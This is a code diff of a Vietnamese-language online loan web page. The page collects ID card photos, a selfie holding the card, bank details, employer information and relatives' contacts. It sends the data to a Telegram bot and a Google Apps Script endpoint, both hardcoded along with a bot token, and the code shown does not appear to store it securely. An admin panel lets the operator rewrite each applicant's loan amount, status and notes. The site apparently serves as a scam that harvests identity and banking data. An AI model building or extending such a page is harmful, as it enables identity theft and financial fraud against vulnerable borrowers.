@@ -283,21 +283,27 @@
                 <button onclick="nextStep(3)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục Xác Thực</button>
             </div>
 
-            <!-- TRANG 4: eKYC CHÂN DUNG CẦM CCCD KÈM HƯỚNG DẪN TRỰC QUAN -->
+            <!-- TRANG 4: eKYC CHÂN DUNG CẦM CCCD KÈM MẪU ẢNH TRỰC QUAN -->
             <div id="step4" class="space-y-4 hidden">
-                <div class="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 text-xs md:text-sm text-amber-900 space-y-1">
-                    <p class="font-black">📌 Hướng dẫn xác thực eKYC chuẩn:</p>
-                    <p class="text-xs text-amber-800">• Đặt CCCD ngay ngắn trong khung hình sáng rõ.</p>
-                    <p class="text-xs text-amber-800">• Không để mất góc, không bị lóa sáng hay mờ chữ.</p>
+                <div class="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 text-xs text-amber-900 space-y-1">
+                    <p class="font-black">📌 Hướng dẫn eKYC chuyên nghiệp:</p>
+                    <p>• Chụp đủ sáng, không bị lóa chữ trên thẻ.</p>
+                    <p>• Ảnh chân dung phải thấy rõ mặt và cầm CCCD ngang ngực.</p>
                 </div>
 
-                <!-- CCCD Mặt Trước -->
-                <div class="space-y-1">
+                <!-- 1. CCCD Mặt Trước -->
+                <div class="space-y-1.5">
                     <div class="flex justify-between items-center">
                         <label class="block text-xs font-bold text-slate-700">1. Mặt Trước CCCD</label>
-                        <span class="text-[10px] text-amber-600 font-bold bg-amber-100 px-2 py-0.5 rounded">💡 Mẫu: Chụp đủ 4 góc</span>
+                        <span class="text-[10px] text-amber-700 font-bold bg-amber-100 px-2 py-0.5 rounded">🖼️ Mẫu chuẩn</span>
                     </div>
-                    <div class="grid grid-cols-2 gap-2">
+                    <div class="w-full h-24 bg-slate-100 border border-slate-300 rounded-xl overflow-hidden relative flex items-center justify-center">
+                        <div class="absolute inset-0 opacity-40 bg-[radial-gradient(#cbd5e1_1px,transparent_1px)] [background-size:8px_8px]"></div>
+                        <div class="text-center space-y-1 z-10 p-2">
+                            <div class="text-xs font-black text-slate-600 bg-white/80 px-3 py-1 rounded-lg shadow-sm inline-block border border-slate-200">Mẫu: Đặt thẻ ngay ngắn, đủ 4 góc</div>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-2 gap-2 pt-1">
                         <label class="border-2 border-dashed border-slate-300 rounded-xl p-2.5 text-center bg-slate-50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
                             📁 Tải ảnh có sẵn
                             <input type="file" accept="image/*" onchange="previewSelectedImage(this, 'previewFront')" class="hidden">
@@ -310,13 +316,19 @@
                     <div id="previewFront" class="mt-2 text-center"></div>
                 </div>
 
-                <!-- CCCD Mặt Sau -->
-                <div class="space-y-1">
+                <!-- 2. CCCD Mặt Sau -->
+                <div class="space-y-1.5">
                     <div class="flex justify-between items-center">
                         <label class="block text-xs font-bold text-slate-700">2. Mặt Sau CCCD</label>
-                        <span class="text-[10px] text-amber-600 font-bold bg-amber-100 px-2 py-0.5 rounded">💡 Mẫu: Rõ mã vạch</span>
+                        <span class="text-[10px] text-amber-700 font-bold bg-amber-100 px-2 py-0.5 rounded">🖼️ Mẫu chuẩn</span>
                     </div>
-                    <div class="grid grid-cols-2 gap-2">
+                    <div class="w-full h-24 bg-slate-100 border border-slate-300 rounded-xl overflow-hidden relative flex items-center justify-center">
+                        <div class="absolute inset-0 opacity-40 bg-[radial-gradient(#cbd5e1_1px,transparent_1px)] [background-size:8px_8px]"></div>
+                        <div class="text-center space-y-1 z-10 p-2">
+                            <div class="text-xs font-black text-slate-600 bg-white/80 px-3 py-1 rounded-lg shadow-sm inline-block border border-slate-200">Mẫu: Không bị mất góc, rõ mã vạch</div>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-2 gap-2 pt-1">
                         <label class="border-2 border-dashed border-slate-300 rounded-xl p-2.5 text-center bg-slate-50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
                             📁 Tải ảnh có sẵn
                             <input type="file" accept="image/*" onchange="previewSelectedImage(this, 'previewBack')" class="hidden">
@@ -329,15 +341,17 @@
                     <div id="previewBack" class="mt-2 text-center"></div>
                 </div>
 
-                <!-- ẢNH CHÂN DUNG CẦM CCCD -->
-                <div class="space-y-1">
+                <!-- 3. Ảnh Chân Dung Cầm CCCD -->
+                <div class="space-y-1.5">
                     <div class="flex justify-between items-center">
-                        <label class="block text-xs font-bold text-slate-700">3. Ảnh Chân Dung Cầm CCCD</label>
-                        <span class="text-[10px] text-emerald-700 font-bold bg-emerald-100 px-2 py-0.5 rounded">💡 Mẫu: Thấy rõ mặt & thẻ</span>
+                        <label class="block text-xs font-bold text-slate-700">3. Chân Dung Cầm CCCD</label>
+                        <span class="text-[10px] text-emerald-700 font-bold bg-emerald-100 px-2 py-0.5 rounded">🖼️ Mẫu chuẩn</span>
                     </div>
-                    <div class="bg-amber-50 border border-amber-200 rounded-xl p-2.5 text-[11px] text-amber-900 flex items-center space-x-2">
-                        <span class="text-lg">📸</span>
-                        <span><b>Hướng dẫn:</b> Cầm CCCD đưa sát ngang cằm, không che mặt, chụp rõ nét đủ ánh sáng.</span>
+                    <div class="w-full h-28 bg-amber-50/80 border border-amber-300 rounded-xl overflow-hidden relative flex items-center justify-center">
+                        <div class="text-center space-y-1 z-10 p-2">
+                            <div class="text-2xl">👤 🪪</div>
+                            <div class="text-[11px] font-black text-amber-900 bg-white px-3 py-1 rounded-lg shadow-sm inline-block border border-amber-200">Mẫu: Khuôn mặt rõ ràng + Thẻ không che mặt</div>
+                        </div>
                     </div>
                     <div class="grid grid-cols-2 gap-2 pt-1">
                         <label class="border-2 border-dashed border-amber-300 rounded-xl p-2.5 text-center bg-amber-50/50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
@@ -360,7 +374,7 @@
                 <div class="flex justify-between items-center border-b border-slate-100 pb-3">
                     <div>
                         <h2 class="text-lg font-black text-slate-900">Quản Trị Đơn Vay</h2>
-                        <p class="text-xs text-amber-600 font-bold">Danh sách hồ sơ quản trị Google Sheets</p>
+                        <p class="text-xs text-amber-600 font-bold">Danh sách hồ sơ đồng bộ đám mây</p>
                     </div>
                     <button onclick="adminLogout()" class="bg-red-50 text-red-600 hover:bg-red-100 px-3 py-1.5 rounded-xl text-xs font-bold transition">Đăng Xuất</button>
                 </div>
@@ -396,7 +410,7 @@
                     </div>
                     <div id="adminLoanList" class="space-y-2 max-h-60 overflow-y-auto">
                         <div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">
-                            Đang tải dữ liệu từ Google Sheets...
+                            Đang tải dữ liệu...
                         </div>
                     </div>
                 </div>
@@ -564,12 +578,10 @@
     <script>
         const BOT_TOKEN = "8813882772:AAFe5hE16dVTUDxwWEruzhNogArLgbGcoi4";
         const CHAT_ID = "8348914397";
-
-        // Google Apps Script Web App URL
         const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHpRwmdjeTMiuP14LiJR21s0sZ0pK-F6G4AztG4WDvDwZVDsLjBm6Vs6oKrmdL3Me/exec";
 
         let formData = {};
-        let allLoans = [];
+        let allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
         let currentSelectedLoanId = null;
 
         let currentUser = localStorage.getItem('ff_current_user') || null;
@@ -618,22 +630,23 @@
             showModal("Thành Công", "Đã lưu cấu hình hỗ trợ thành công!");
         }
 
-        // Tải dữ liệu từ Google Sheets
         async function fetchCloudData() {
             try {
                 let res = await fetch(SCRIPT_URL);
                 let json = await res.json();
-                if(json && Array.isArray(json.loans)) {
-                    allLoans = json.loans.reverse(); // Đơn mới nhất lên đầu
+                if(json && Array.isArray(json.loans) && json.loans.length > 0) {
+                    allLoans = json.loans.reverse();
+                    localStorage.setItem('ff_loans', JSON.stringify(allLoans));
                 }
             } catch(e) {
-                console.log("Lỗi tải từ Google Sheets", e);
+                allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
             }
             if(isAdminLoggedIn) renderAdminLoanList();
         }
 
-        // Đẩy dữ liệu lên Google Sheets
         async function saveCloudData(loanObj) {
+            allLoans.unshift(loanObj);
+            localStorage.setItem('ff_loans', JSON.stringify(allLoans));
             try {
                 await fetch(SCRIPT_URL, {
                     method: 'POST',
@@ -642,7 +655,7 @@
                     body: JSON.stringify(loanObj)
                 });
             } catch(e) {
-                console.log("Lỗi đẩy dữ liệu", e);
+                console.log("Lỗi đồng bộ mây", e);
             }
         }
 
@@ -767,7 +780,7 @@
                     document.getElementById('profileUserPhone').textContent = "SĐT: " + currentUser;
                     document.getElementById('profileAvatar').textContent = (currentUserName || "K").charAt(0).toUpperCase();
                     
-                    const userLoan = allLoans.find(l => l.user === currentUser);
+                    const userLoan = allLoans.find(l => String(l.User || l.user || l.USER) === String(currentUser));
                     const badge = document.getElementById('ekycBadge');
                     if(userLoan) {
                         badge.textContent = "✅ Đã xác thực eKYC";
@@ -784,33 +797,47 @@
 
         function renderClientApplications() {
             const container = document.getElementById('appStatusContainer');
-            const userLoans = allLoans.filter(l => l.user === currentUser);
+            const userLoans = allLoans.filter(l => String(l.User || l.user || l.USER) === String(currentUser));
             if(userLoans.length === 0) {
                 container.innerHTML = `<div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 text-center space-y-3"><div class="text-4xl">📂</div><p class="text-xs md:text-sm text-slate-500 font-bold">Bạn chưa có hồ sơ vay nào được gửi đi.</p><button onclick="switchTab('home')" class="bg-amber-400 text-slate-900 px-5 py-2.5 rounded-xl text-xs md:text-sm font-bold shadow-sm">Tạo Hồ Sơ Vay</button></div>`;
                 return;
             }
             let html = '';
             userLoans.forEach(loan => {
+                const amount = loan.Amount || loan.amount || loan.AMOUNT || '';
+                const term = loan.Term || loan.term || loan.TERM || '';
+                const monthly = loan.MonthlyPayment || loan.monthlyPayment || '';
+                const purpose = loan.Purpose || loan.purpose || '';
+                const income = loan.Income || loan.income || '';
+                const company = loan.Company || loan.company || '';
+                const compPhone = loan.CompPhone || loan.compPhone || '';
+                const payDay = loan.PayDay || loan.payDay || '';
+                const bankName = loan.BankName || loan.bankName || '';
+                const bankAcc = loan.BankAccount || loan.bankAccount || '';
+                const time = loan.Time || loan.time || '';
+                const status = loan.Status || loan.status || 'Đang thẩm định';
+                const note = loan.Note || loan.note || '';
+
                 html += `<div class="bg-slate-50 border border-slate-200 rounded-2xl p-4.5 space-y-3.5 text-xs md:text-sm shadow-sm">
                     <div class="flex justify-between items-center border-b border-slate-200 pb-2.5">
                         <span class="font-black text-slate-900 text-base">Hồ Sơ Vay Tiêu Dùng</span>
-                        <span class="font-bold text-amber-700 bg-amber-100 px-3 py-1 rounded-full text-xs">${loan.status}</span>
+                        <span class="font-bold text-amber-700 bg-amber-100 px-3 py-1 rounded-full text-xs">${status}</span>
                     </div>
                     <div class="grid grid-cols-2 gap-3 text-xs">
-                        <div><span class="text-slate-500 block font-semibold">Số tiền vay:</span><strong class="text-slate-900 text-sm">${loan.amount}</strong></div>
-                        <div><span class="text-slate-500 block font-semibold">Kỳ hạn vay:</span><strong class="text-slate-900 text-sm">${loan.term}</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Số tiền vay:</span><strong class="text-slate-900 text-sm">${amount}</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Kỳ hạn vay:</span><strong class="text-slate-900 text-sm">${term}</strong></div>
                         <div><span class="text-slate-500 block font-semibold">Lãi suất hàng tháng:</span><strong class="text-emerald-600">1.2% / tháng</strong></div>
-                        <div><span class="text-slate-500 block font-semibold">Đóng hàng tháng:</span><strong class="text-amber-700 text-sm">${loan.monthlyPayment}</strong></div>
-                        <div><span class="text-slate-500 block font-semibold">Mục đích vay:</span><strong class="text-slate-800">${loan.purpose}</strong></div>
-                        <div><span class="text-slate-500 block font-semibold">Thu nhập:</span><strong class="text-slate-800">${loan.income}</strong></div>
-                        <div class="col-span-2"><span class="text-slate-500 block font-semibold">Nơi làm việc:</span><strong class="text-slate-800">${loan.company} (${loan.compPhone})</strong></div>
-                        <div class="col-span-2"><span class="text-slate-500 block font-semibold">Ngày đóng lãi hàng tháng:</span><strong class="text-amber-600">${loan.payDay}</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Đóng hàng tháng:</span><strong class="text-amber-700 text-sm">${monthly}</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Mục đích vay:</span><strong class="text-slate-800">${purpose}</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Thu nhập:</span><strong class="text-slate-800">${income}</strong></div>
+                        <div class="col-span-2"><span class="text-slate-500 block font-semibold">Nơi làm việc:</span><strong class="text-slate-800">${company} (${compPhone})</strong></div>
+                        <div class="col-span-2"><span class="text-slate-500 block font-semibold">Ngày đóng lãi hàng tháng:</span><strong class="text-amber-600">${payDay}</strong></div>
                     </div>
                     <div class="border-t border-slate-200 pt-2.5 space-y-1.5 text-xs">
-                        <div class="flex justify-between"><span class="text-slate-500 font-semibold">Ngân hàng nhận:</span><span class="font-bold">${loan.bankName} (${loan.bankAccount})</span></div>
-                        <div class="flex justify-between"><span class="text-slate-500 font-semibold">Ngày đăng ký:</span><span class="font-bold">${loan.time}</span></div>
+                        <div class="flex justify-between"><span class="text-slate-500 font-semibold">Ngân hàng nhận:</span><span class="font-bold">${bankName} (${bankAcc})</span></div>
+                        <div class="flex justify-between"><span class="text-slate-500 font-semibold">Ngày đăng ký:</span><span class="font-bold">${time}</span></div>
                     </div>
-                    ${loan.note ? `<div class="bg-blue-50 border border-blue-200 p-3 rounded-xl text-blue-900 text-xs font-semibold">📝 <b>Ghi chú từ hệ thống:</b> ${loan.note}</div>` : ''}
+                    ${note ? `<div class="bg-blue-50 border border-blue-200 p-3 rounded-xl text-blue-900 text-xs font-semibold">📝 <b>Ghi chú từ hệ thống:</b> ${note}</div>` : ''}
                 </div>`;
             });
             container.innerHTML = html;
@@ -928,13 +955,20 @@
             let selectHtml = `<option value="">-- Bấm chọn khách hàng cần copy cú pháp --</option>`;
             
             allLoans.forEach((loan, idx) => {
+                const name = loan.Name || loan.name || loan.NAME || 'Khách hàng';
+                const amount = loan.Amount || loan.amount || loan.AMOUNT || '';
+                const term = loan.Term || loan.term || loan.TERM || '';
+                const user = loan.User || loan.user || loan.USER || '';
+                const bankAcc = loan.BankAccount || loan.bankAccount || '';
+                const status = loan.Status || loan.status || 'Đang thẩm định';
+
                 html += `<div onclick="selectAdminLoan(${idx})" class="p-3.5 bg-white border border-slate-200 rounded-xl cursor-pointer hover:border-amber-400 transition space-y-1.5 text-xs shadow-sm">
-                    <div class="flex justify-between font-bold text-slate-900 text-sm"><span>${loan.Name}</span><span class="text-amber-600">${loan.Amount} (${loan.Term})</span></div>
-                    <div class="text-xs text-slate-600">SĐT/Mã phiên: #${loan.User} | STK: ${loan.BankAccount}</div>
-                    <div class="flex justify-between items-center pt-1"><span class="text-[11px] font-bold px-2.5 py-0.5 rounded bg-amber-50 text-amber-700">${loan.Status}</span><span class="text-xs text-blue-600 font-bold">🔍 Bấm để xem và sửa đơn</span></div>
+                    <div class="flex justify-between font-bold text-slate-900 text-sm"><span>${name}</span><span class="text-amber-600">${amount} (${term})</span></div>
+                    <div class="text-xs text-slate-600">SĐT/Mã phiên: #${user} | STK: ${bankAcc}</div>
+                    <div class="flex justify-between items-center pt-1"><span class="text-[11px] font-bold px-2.5 py-0.5 rounded bg-amber-50 text-amber-700">${status}</span><span class="text-xs text-blue-600 font-bold">🔍 Bấm để xem và sửa đơn</span></div>
                 </div>`;
                 
-                selectHtml += `<option value="${loan.User}">Khách: ${loan.Name} (SĐT: #${loan.User})</option>`;
+                selectHtml += `<option value="${user}">Khách: ${name} (SĐT: #${user})</option>`;
             });
             listEl.innerHTML = html;
             selectEl.innerHTML = selectHtml;
@@ -955,19 +989,19 @@
             currentSelectedLoanId = idx;
             const loan = allLoans[idx];
             
-            document.getElementById('editName').value = loan.Name || '';
-            document.getElementById('editAmount').value = loan.Amount || '';
-            document.getElementById('editTerm').value = loan.Term || '';
-            document.getElementById('editMonthly').value = loan.MonthlyPayment || '';
-            document.getElementById('editIncome').value = loan.Income || '';
-            document.getElementById('editBankName').value = loan.BankName || '';
-            document.getElementById('editStk').value = loan.BankAccount || '';
-            document.getElementById('editBankOwner').value = loan.BankOwner || '';
-            document.getElementById('editCccd').value = loan.Cccd || '';
-            document.getElementById('editDob').value = loan.Dob || '';
-            document.getElementById('editCompany').value = loan.Company || '';
-            document.getElementById('editRelative').value = (loan.RName || '') + " - " + (loan.RPhone || '') + " - " + (loan.RRelation || '');
-            document.getElementById('editNote').value = loan.Note || '';
+            document.getElementById('editName').value = loan.Name || loan.name || '';
+            document.getElementById('editAmount').value = loan.Amount || loan.amount || '';
+            document.getElementById('editTerm').value = loan.Term || loan.term || '';
+            document.getElementById('editMonthly').value = loan.MonthlyPayment || loan.monthlyPayment || '';
+            document.getElementById('editIncome').value = loan.Income || loan.income || '';
+            document.getElementById('editBankName').value = loan.BankName || loan.bankName || '';
+            document.getElementById('editStk').value = loan.BankAccount || loan.bankAccount || '';
+            document.getElementById('editBankOwner').value = loan.BankOwner || loan.bankOwner || '';
+            document.getElementById('editCccd').value = loan.Cccd || loan.cccd || '';
+            document.getElementById('editDob').value = loan.Dob || loan.dob || '';
+            document.getElementById('editCompany').value = loan.Company || loan.company || '';
+            document.getElementById('editRelative').value = (loan.RName || loan.rName || '') + " - " + (loan.RPhone || loan.rPhone || '') + " - " + (loan.RRelation || loan.rRelation || '');
+            document.getElementById('editNote').value = loan.Note || loan.note || '';
 
             document.getElementById('adminDetailBox').classList.remove('hidden');
         }
@@ -980,7 +1014,6 @@
         async function updateLoanAction(newStatus) {
             if(currentSelectedLoanId === null) return;
             
-            // Cập nhật trạng thái trực tiếp trên mảng và đẩy lại lên Google Sheets (hoặc thông báo)
             allLoans[currentSelectedLoanId].Status = newStatus;
             allLoans[currentSelectedLoanId].Note = document.getElementById('editNote').value;
 
